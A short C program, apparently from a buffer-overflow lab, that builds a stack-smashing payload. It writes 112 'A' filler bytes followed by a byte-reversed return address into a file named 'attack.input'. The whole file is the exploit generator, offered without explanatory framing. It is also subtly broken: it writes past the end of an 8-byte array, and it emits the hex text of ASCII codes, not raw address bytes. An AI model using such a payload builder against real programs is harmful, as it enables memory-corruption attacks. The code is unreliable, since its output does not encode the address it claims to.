#include <stdio.h>
#include <stdlib.h>  /* For exit() function */
#include<string.h>

int main(int argc,char* argv[])
{
   char c[120];
   char t[8];
  char outword[17];
    FILE *fptr;
    int i=0;
    int j=0;
    int m=0;
    int out[20];
    int temp=0;
    int len =0;
    char addr[10];
	if(argc!=2)
	{
		printf("incorrect input\n");
		exit(0);
	}

   strcpy(addr,argv[1]);
   fptr=fopen("attack.input","w");
   if(fptr==NULL)
   {
      printf("Error!");
      exit(1);
   }

    len =strlen(argv[1]);
	if(len !=8)
	{
		printf("\n incorrect address\n");
		exit(0);
	}

   j=(len-2);
   temp =j;
   int k=0;
   while(j>=0)
   {
	temp =j;
        t[k]=argv[1][temp];
        k++;
        temp++;

        t[k]=argv[1][temp];
        k++;
        temp++;

        j=j-2;
    }
	t[k]='\0';

    for(i = 0; i<len; i++){
        sprintf(outword+i*2, "%X", t[i]);
    }  


   for(i=0 ; i<112 ;i++)
   {
	c[i]='A';
	m = 'A';
	fprintf(fptr,"%c",m);
   }
	len = strlen(outword);
  for(i=0;i<len;i++)
  {
	out[i] = outword[i];
  	fprintf(fptr,"%c",out[i]);
  }

   printf("%s",t);
   fclose(fptr);
   return 0;
}
